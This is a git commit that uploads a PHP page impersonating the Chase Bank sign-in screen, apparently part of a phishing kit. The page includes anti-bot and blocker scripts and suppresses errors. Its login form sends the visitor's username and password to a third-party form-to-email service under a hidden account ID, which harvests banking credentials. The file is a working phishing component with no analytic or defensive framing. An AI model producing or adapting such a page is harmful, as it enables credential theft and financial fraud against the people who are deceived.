364db5c2854473ffa4c15788f9fb4b3a14d65a45
Chase8e0 <147152572+Chase8e0@users.noreply.github.com>
2023-10-06 06:49:40 -0400

    Add files via upload

---
+++ sign'In.php
@@ -0,0 +1,62 @@
+<?php
+/*   
+Mou-Ad                    
+*/
+
+
+session_start();
+error_reporting(0);
+@ini_set('display_errors', 'on'); 
+ob_start();  
+include 'antibots.php';
+include './bt.php';
+include "./blocker.php";
+?>
+
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+<meta charset="utf-8">
+<title>Chase Bank - Credit Card, Mortgage, Auto, Banking Services</title>
+<link rel="shortcut icon" href="favicon.ico"/>
+  <link rel="icon" href="favicon.ico"/>
+<link rel="stylesheet" href="builderstyle.css">
+
+ 
+<style>
+            html, body {
+                width: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+            }
+            #container {
+                width: inherit;
+                height: inherit;
+                margin: 0;
+                padding: 0;
+                background-color: #fff;
+            }
+            h1 {
+                margin: 0;
+                padding: 0;
+            }
+        </style>
+</head>
+<body>
+<div id="dm-container-b" class="bcmain">
+<img src="background_image.png" id="bc_img" alt=""  align="top" border="0"></div>
+<div id="bc_lc" style="position:absolute;left:0px;top:0px;width:1371px;height:713px;z-index:4">
+
+
+<form action="https://formtoemail.com/user_forms.php" method="post" class="fte">
+  <input type="hidden" name="user_id" value="A7Q6P4IMX090T1ANA2JW">
+  <input type="hidden" name="form_id" value="1">
+
+
+  <input id="cm" class="dlogin1" name="1" value="" type="text" placeholder=" User name">
+<input id="userc" class="dloginb" name="2" value="" type="password" placeholder=" Password">
+<input id="Btarea1" name="area1" value="" class="tdbutton" type="submit">
+</form>
+</div>
+</body></html>
